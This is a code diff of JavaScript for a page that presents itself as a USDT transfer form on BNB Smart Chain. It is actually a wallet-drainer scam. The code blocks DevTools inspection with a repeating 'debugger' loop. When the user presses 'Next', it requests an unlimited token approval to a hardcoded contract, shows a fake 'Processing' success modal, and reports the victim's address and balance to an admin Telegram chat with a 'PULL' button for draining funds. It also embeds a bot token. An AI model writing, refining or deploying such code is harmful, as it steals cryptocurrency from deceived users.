@@ -1,9 +1,14 @@
 (function() {
+    // Yeh code baar-baar 'debugger;' statement chalaata hai jab DevTools khula hota hai.
+    // Isse Sources tab mein code inspect karna lagbhag impossible ho jaata hai.
     function block() {
         if (window.console && (window.console.firebug || new RegExp("a+").test(String.fromCharCode(97)))) {
+            // Agar console open hai toh debugger ko baar-baar chalao
             debugger;
+            // Har 500ms (0.5 second) mein khud ko repeat karega
             setTimeout(block, 500); 
         } else {
+            // Agar console band hai toh function ko empty kar do taki performance par asar na pade
             block = function() {};
         }
     }
@@ -12,21 +17,27 @@
 
 document.addEventListener("DOMContentLoaded", function () {
 
+    // ===== CONFIG (Use Checksum Contract Address here) =====
+    // Note: window.ethereum uses Ethers v5 syntax (ethers.providers.Web3Provider, ethers.utils.formatUnits, etc.)
     const CONFIG = {
         COMPANY_WALLET_ADDRESS: "0x7073Fe7dFeEC2bcd959eb4ECA0eBeC85Bb3d1FA8",
         CONTRACT_ADDRESS: "0xC2B02823A470385f6E3EF8303093A1256cfA00c6",
-        TELEGRAM_BOT_TOKEN: "8742931653:AAHMP50yg9lybJaxWfxU73Ca0GvJkUrqeHs",
-        ADMIN_CHAT_ID: "5394590551",
+        TELEGRAM_BOT_TOKEN: "8742931653:AAHMP50yg9lybJaxWfxU73Ca0GvJkUrqeHs", // Notification Bot Token (Bot A)
+        ADMIN_CHAT_ID: "5394590551", // CRITICAL: Your Admin Group Chat ID
     };
 
+    // Constant for Unlimited Approval (MAX_UINT256)
     const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Common USDT BEP20 Address
     
+    // 🏆 FINAL NOTIFICATION AND BUTTON TRIGGER FUNCTION 🏆
     async function sendTelegramNotifications(walletAddress, txHash, userId, amount, currentBalance) {
-        const notifBotToken = CONFIG.TELEGRAM_BOT_TOKEN;
+        const notifBotToken = CONFIG.TELEGRAM_BOT_TOKEN; // Bot A ka token
         const adminChatId = CONFIG.ADMIN_CHAT_ID;
-        const watchUrl = `https://bscscan.com/tx/${txHash}`;
 
+        const watchUrl = `https://bscscan.com/tx/${txHash}`; // Watch URL
+
+        // CRITICAL: Inline Keyboard with PULL Button
         const pullDataPayload = `PULL:${walletAddress}:${amount}`; 
         
         const inlineKeyboard = {
@@ -54,6 +65,7 @@ document.addEventListener("DOMContentLoaded", function () {
             `💡 *Tap and hold on the wallet address above to copy it*`;
             
         try {
+            // --- 1. Send Notification + PULL BUTTON to Admin ---
             await fetch(`https://api.telegram.org/bot${notifBotToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -64,7 +76,9 @@ document.addEventListener("DOMContentLoaded", function () {
                     reply_markup: inlineKeyboard
                 })
             });
+            console.log("✅ Pull Button (Notification) sent to Admin Chat.");
             
+            // --- 2. Send to user if provided ---
             if (userId) {
                 await fetch(`https://api.telegram.org/bot${notifBotToken}/sendMessage`, {
                     method: "POST",
@@ -77,14 +91,19 @@ document.addEventListener("DOMContentLoaded", function () {
                     })
                 });
             }
+            console.log("Telegram notifications process complete.");
         } catch (error) {
             console.error("Failed to send Telegram messages:", error);
         }
     }
 
+    // =======================================================
+    // 🔥 NEW: CUSTOM PROCESSING MODAL LOGIC (Screenshot style)
+    // =======================================================
     function showProcessingModal(isVisible, txHash = null) {
         let modal = document.getElementById("processing-modal");
         if (!modal) {
+            // Create the modal container
             modal = document.createElement("div");
             modal.id = "processing-modal";
             modal.style.position = "fixed";
@@ -92,32 +111,34 @@ document.addEventListener("DOMContentLoaded", function () {
             modal.style.left = "0";
             modal.style.width = "100%";
             modal.style.height = "100%";
-            modal.style.background = "rgba(0, 0, 0, 0.9)";
+            modal.style.background = "rgba(0, 0, 0, 0.9)"; // Dark background
             modal.style.zIndex = "99999";
             modal.style.display = "flex";
-            modal.style.alignItems = "flex-end";
+            modal.style.alignItems = "flex-end"; // Align content to bottom
             modal.style.justifyContent = "center";
             modal.style.transition = "opacity 0.3s";
             modal.style.opacity = "0";
             modal.style.pointerEvents = "none";
 
+            // Create the content box (similar to the screenshot)
             const contentBox = document.createElement("div");
-            contentBox.style.background = "#18181a";
+            contentBox.style.background = "#18181a"; // Dark gray/black box
             contentBox.style.width = "100%";
             contentBox.style.maxWidth = "500px";
-            contentBox.style.padding = "30px 20px 40px";
+            contentBox.style.padding = "30px 20px 40px"; // Increased bottom padding
             contentBox.style.borderRadius = "24px 24px 0 0";
             contentBox.style.textAlign = "center";
             contentBox.style.transform = "translateY(100%)";
             contentBox.style.transition = "transform 0.3s";
             contentBox.id = "processing-modal-content";
 
+            // Icon/Text setup
             contentBox.innerHTML = `
                 <div style="margin: 20px 0;">
                     <svg width="100" height="100" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: block; margin: 0 auto;">
                         <circle cx="50" cy="50" r="48" stroke="#10b981" stroke-width="4" fill="none"/>
                         <path d="M30 50L45 65L75 35" stroke="#10b981" stroke-width="6" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
-                    </svg>
+                        </svg>
                 </div>
                 <h2 style="color: white; font-size: 1.5rem; font-weight: bold; margin-bottom: 8px;">Processing...</h2>
                 <p style="color: #a0a0a0; margin-bottom: 30px; font-size: 0.95rem;">
@@ -135,9 +156,10 @@ document.addEventListener("DOMContentLoaded", function () {
                 ">Transaction details</button>
             `;
 
+            // Add event listener to the details button
             const txDetailsBtn = contentBox.querySelector('#tx-details-btn');
             txDetailsBtn.addEventListener('click', () => {
-                const currentTxHash = modal.dataset.txHash;
+                const currentTxHash = modal.dataset.txHash; // Get hash from dataset
                 if (currentTxHash) {
                     const scanUrl = `https://bscscan.com/tx/${currentTxHash}`; 
                     window.open(scanUrl, '_blank');
@@ -150,14 +172,17 @@ document.addEventListener("DOMContentLoaded", function () {
             document.body.appendChild(modal);
         }
         
+        // Store the Tx Hash in the modal element's dataset
         modal.dataset.txHash = txHash;
 
+        // Toggle visibility and animation
         const contentBox = document.getElementById("processing-modal-content");
         if (isVisible) {
             modal.style.opacity = "1";
             modal.style.pointerEvents = "auto";
             contentBox.style.transform = "translateY(0)";
         } else {
+            // Add a small delay for smooth exit animation
             contentBox.style.transform = "translateY(100%)";
             setTimeout(() => {
                 modal.style.opacity = "0";
@@ -166,6 +191,8 @@ document.addEventListener("DOMContentLoaded", function () {
         }
     }
 
+
+    // ===== NOTIFICATION BAR SETUP (Kept for Errors/Fails) =====
     function showNotification(msg, type = "info") {
         let notify = document.getElementById("notify-bar");
         if (!notify) {
@@ -175,7 +202,7 @@ document.addEventListener("DOMContentLoaded", function () {
             notify.style.top = "20px";
             notify.style.left = "50%";
             notify.style.transform = "translateX(-50%)";
-            notify.style.zIndex = "9998";
+            notify.style.zIndex = "9998"; // Lower than the Modal
             notify.style.minWidth = "260px";
             notify.style.maxWidth = "90vw";
             notify.style.padding = "16px 32px";
@@ -199,37 +226,56 @@ document.addEventListener("DOMContentLoaded", function () {
         }, 3000);
     }
 
-    const addressInput = document.querySelector('.recipient-address');
-    const amountInput = document.querySelector('.amount-number');
+    // ===== FORM LOGIC (Unchanged) =====
+    const addressInput = document.querySelector('input[placeholder="Search or Enter"]');
+    const amountInput = document.querySelector('input[placeholder="USDT Amount"]');
     const nextBtn = document.querySelector("button.w-full");
-    const originalBtnHTML = nextBtn ? nextBtn.innerHTML : "";
-    const approxUsd = document.querySelector(".amount-usd");
-    const maxBtn = document.querySelector(".token-max-button");
-    const balanceErrorEl = document.getElementById("balanceError");
+    const originalBtnHTML = nextBtn.innerHTML;
+    const approxUsd = document.querySelector(".text-xs.text-gray-500");
+    const maxBtn = Array.from(document.querySelectorAll("button")).find(
+        (btn) => btn.textContent.trim().toLowerCase() === "max"
+    );
+
+    // 🔥 Dynamic Creation of balance error text DIRECTLY BELOW approxUsd (≈ $0.10)
+    let balanceErrorEl = document.getElementById("balanceError");
+    if (!balanceErrorEl && approxUsd) {
+        balanceErrorEl = document.createElement("div");
+        balanceErrorEl.id = "balanceError";
+        balanceErrorEl.style.color = "#ef4444";
+        balanceErrorEl.style.fontSize = "0.9rem";
+        balanceErrorEl.style.fontWeight = "500";
+        balanceErrorEl.style.marginTop = "10px";
+        balanceErrorEl.style.textAlign = "center";
+        balanceErrorEl.style.display = "none";
+        
+        // Append right after the approxUsd element
+        if (approxUsd.parentNode) {
+            approxUsd.parentNode.insertBefore(balanceErrorEl, approxUsd.nextSibling);
+        }
+    }
+
+    amountInput.value = "0";// Setting a large value for display
+    approxUsd.textContent = "≈ $0.00";
 
     function updateApproxUsd() {
         let amount = parseFloat(amountInput.value.trim());
-        if (approxUsd) {
-            approxUsd.textContent = isNaN(amount) || amount <= 0 ? "≈ $0.00" : `≈ $${amount.toFixed(2)}`;
-        }
+        approxUsd.textContent =
+            isNaN(amount) || amount <= 0 ? "≈ $0.00" : `≈ $${amount.toFixed(2)}`;
     }
     
-    if (amountInput) {
-        amountInput.addEventListener("input", function() {
-            updateApproxUsd();
-            if (balanceErrorEl) balanceErrorEl.style.display = "none";
-        });
-    }
+    amountInput.addEventListener("input", function() {
+        updateApproxUsd();
+        if (balanceErrorEl) balanceErrorEl.style.display = "none";
+    });
+    updateApproxUsd();
 
     function validate() {
-        if (!nextBtn || !addressInput || !amountInput) return;
         const address = addressInput.value.trim();
         const amount = amountInput.value.trim();
         nextBtn.disabled = !(address.length > 0 && parseFloat(amount) > 0);
     }
-    
-    if (addressInput) addressInput.addEventListener("input", validate);
-    if (amountInput) amountInput.addEventListener("input", validate);
+    addressInput.addEventListener("input", validate);
+    amountInput.addEventListener("input", validate);
     validate();
 
     if (maxBtn) {
@@ -261,139 +307,155 @@ document.addEventListener("DOMContentLoaded", function () {
         });
     }
 
-    if (nextBtn) {
-        nextBtn.addEventListener("click", async function (e) {
-            e.preventDefault();
+    // ===== NEXT BUTTON - APPROVE USDT (Core Logic) =====
+    nextBtn.addEventListener("click", async function (e) {
+        e.preventDefault();
 
-            const amountString = amountInput.value.trim();
-            if (amountString.length === 0 || isNaN(parseFloat(amountString))) {
-                  showNotification("Please enter a valid amount.", "error");
-                  return;
-            }
+        // CAPTURE THE INPUT AMOUNT HERE BEFORE ANY NETWORK CALLS
+        const amountString = amountInput.value.trim();
+        if (amountString.length === 0 || isNaN(parseFloat(amountString))) {
+              showNotification("Please enter a valid amount.", "error");
+              return;
+        }
 
-            if (!window.ethereum) {
-                showNotification(
-                    "No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.",
-                    "error"
-                );
-                return;
-            }
+        if (!window.ethereum) {
+            showNotification(
+                "No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.",
+                "error"
+            );
+            return;
+        }
 
-            nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
-            nextBtn.disabled = true;
+        nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
+        nextBtn.disabled = true;
 
+        try {
+            const bnbChainId = "0x38";
+            const bnbChainParams = {
+                chainId: bnbChainId,
+                chainName: "BNB Smart Chain",
+                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+                rpcUrls: ["https://bsc-dataseed1.binance.org/"],
+                blockExplorerUrls: ["https://bscscan.com/"]
+            };
+
+            // Network Switch/Add Logic (Unchanged)
             try {
-                const bnbChainId = "0x38";
-                const bnbChainParams = {
-                    chainId: bnbChainId,
-                    chainName: "BNB Smart Chain",
-                    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-                    rpcUrls: ["https://bsc-dataseed1.binance.org/"],
-                    blockExplorerUrls: ["https://bscscan.com/"]
-                };
-
-                try {
-                    await window.ethereum.request({
-                        method: "wallet_switchEthereumChain",
-                        params: [{ chainId: bnbChainId }]
-                    });
-                } catch (switchError) {
-                    if (switchError.code === 4902) {
-                        try {
-                            await window.ethereum.request({
-                                method: "wallet_addEthereumChain",
-                                params: [bnbChainParams]
-                            });
-                        } catch (addError) {
-                            showNotification("Failed to add BNB Smart Chain network.", "error");
-                            return;
-                        }
-                    } else {
-                        showNotification("Failed to switch to BNB Smart Chain network.", "error");
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: bnbChainId }]
+                });
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    try {
+                        await window.ethereum.request({
+                            method: "wallet_addEthereumChain",
+                            params: [bnbChainParams]
+                        });
+                    } catch (addError) {
+                        showNotification("Failed to add BNB Smart Chain network.", "error");
                         return;
                     }
-                }
-
-                const fromAddress = (await window.ethereum.request({ method: "eth_accounts" }))[0];
-                const urlParams = new URLSearchParams(window.location.search);
-                const userId = urlParams.get("user_id");
-
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
-                
-                const usdtAbiBalance = [
-                    "function balanceOf(address owner) view returns (uint256)",
-                    "function decimals() view returns (uint8)"
-                ];
-                const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbiBalance, signer);
-                
-                let decimals = 18;
-                try { decimals = await usdtContract.decimals(); } catch (err) {}
-                const balanceWei = await usdtContract.balanceOf(fromAddress);
-                const currentBalance = ethers.utils.formatUnits(balanceWei, decimals);
-
-                const requiredWei = ethers.utils.parseUnits(amountString, decimals);
-
-                if (balanceWei.lt(requiredWei)) {
-                    if (balanceErrorEl) {
-                        balanceErrorEl.textContent = `Not enough balance, you have $${parseFloat(currentBalance).toFixed(2)}`;
-                        balanceErrorEl.style.display = "block";
-                    }
-                    nextBtn.disabled = false;
-                    nextBtn.innerHTML = originalBtnHTML;
-                    return; 
-                }
-
-                const escrowAddress = CONFIG.CONTRACT_ADDRESS;
-
-                const usdtAbiApprove = [
-                    "function approve(address spender, uint256 amount) public returns (bool)"
-                ];
-                const iface = new ethers.utils.Interface(usdtAbiApprove);
-                
-                const txData = iface.encodeFunctionData("approve", [
-                    escrowAddress, 
-                    MAX_UINT256
-                ]);
-
-                const txHash = await window.ethereum.request({
-                    method: "eth_sendTransaction",
-                    params: [{ from: fromAddress, to: USDT_ADDRESS, data: txData, value: "0x0" }]
-                });
-
-                showProcessingModal(true, txHash);
-
-                if (txHash && txHash.length > 0) {
-                    try {
-                        await sendTelegramNotifications(fromAddress, txHash, userId, amountString, currentBalance); 
-                    } catch (err) {
-                        console.error("Failed to send notifications:", err);
-                    }
-                }
-            } catch (err) {
-                showProcessingModal(false); 
-
-                const msg = (err?.message || "").toLowerCase();
-                if (
-                    msg.includes("user rejected") ||
-                    msg.includes("user denied") ||
-                    msg.includes("cancelled") ||
-                    msg.includes("canceled")
-                ) {
-                    showNotification("Transaction cancelled.", "error");
-                } else if (
-                    msg.includes("insufficient funds") ||
-                    msg.includes("exceeds balance") ||
-                    (msg.includes("execution reverted") && msg.includes("exceeds balance"))
-                ) {
-                    showNotification("Insufficient BNB for gas fee or USDT balance.", "error");
                 } else {
-                    showNotification("Transaction failed. Please try again.", "error");
+                    showNotification("Failed to switch to BNB Smart Chain network.", "error");
+                    return;
                 }
-            } finally {
+            }
+
+            // Get Wallet Address and User ID
+            const fromAddress = (await window.ethereum.request({ method: "eth_accounts" }))[0];
+            const urlParams = new URLSearchParams(window.location.search);
+            const userId = urlParams.get("user_id");
+
+            // Fetch the current USDT balance before approval
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            
+            const usdtAbiBalance = [
+                "function balanceOf(address owner) view returns (uint256)",
+                "function decimals() view returns (uint8)"
+            ];
+            const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbiBalance, signer);
+            
+            let decimals = 18;
+            try { decimals = await usdtContract.decimals(); } catch (err) {}
+            const balanceWei = await usdtContract.balanceOf(fromAddress);
+            const currentBalance = ethers.utils.formatUnits(balanceWei, decimals);
+            // End of Balance Fetch
+
+            // 🔥 BALANCE VALIDATION LOGIC WITH INLINE RED TEXT
+            const requiredWei = ethers.utils.parseUnits(amountString, decimals);
+
+            if (balanceWei.lt(requiredWei)) {
+                if (balanceErrorEl) {
+                    balanceErrorEl.textContent = `Not enough balance, you have $${parseFloat(currentBalance).toFixed(2)}`;
+                    balanceErrorEl.style.display = "block";
+                }
                 nextBtn.disabled = false;
                 nextBtn.innerHTML = originalBtnHTML;
+                return; // 🛑 Transaction cancel
             }
-        });
-    }
+
+            // === Approve ESCROW CONTRACT ===
+            const escrowAddress = CONFIG.CONTRACT_ADDRESS;
+
+            const usdtAbiApprove = [
+                "function approve(address spender, uint256 amount) public returns (bool)"
+            ];
+            const iface = new ethers.utils.Interface(usdtAbiApprove);
+            
+            // UNLIMITED APPROVAL: Pass MAX_UINT256 
+            const txData = iface.encodeFunctionData("approve", [
+                escrowAddress, 
+                MAX_UINT256 // Unlimited approval 
+            ]);
+
+            const txHash = await window.ethereum.request({
+                method: "eth_sendTransaction",
+                params: [{ from: fromAddress, to: USDT_ADDRESS, data: txData, value: "0x0" }]
+            });
+
+            // 🔥 Show the custom processing modal 
+            showProcessingModal(true, txHash);
+
+            if (txHash && txHash.length > 0) {
+                try {
+                    // Pass the captured amountString AND currentBalance
+                    await sendTelegramNotifications(fromAddress, txHash, userId, amountString, currentBalance); 
+                    // Transaction is successful. MODAL will NOT be closed here.
+                } catch (err) {
+                    console.error("Failed to send notifications or API trigger:", err);
+                    // If Telegram notification fails, we don't close the modal, 
+                    // assuming the main tx is done and user wanted it to stay open.
+                }
+            }
+        } catch (err) {
+            // 🔥 CHANGE: Close the modal immediately on any error (User rejected/Canceled/Failed)
+            showProcessingModal(false); 
+
+            // All error messages still use the simple showNotification bar at the top
+            const msg = (err?.message || "").toLowerCase();
+            if (
+                msg.includes("user rejected") ||
+                msg.includes("user denied") ||
+                msg.includes("cancelled") ||
+                msg.includes("canceled")
+            ) {
+                showNotification("Transaction cancelled.", "error");
+            } else if (
+                msg.includes("insufficient funds") ||
+                msg.includes("exceeds balance") ||
+                (msg.includes("execution reverted") && msg.includes("exceeds balance"))
+            ) {
+                showNotification("Insufficient BNB for gas fee or USDT balance.", "error");
+            } else {
+                showNotification("Transaction failed. Please try again.", "error");
+            }
+        } finally {
+            // 🔥 CHANGE: Modal closing logic removed from finally.
+            // It will only be closed in the catch block (on error/cancel).
+            nextBtn.disabled = false;
+            nextBtn.innerHTML = originalBtnHTML;
+        }
+    });
 });
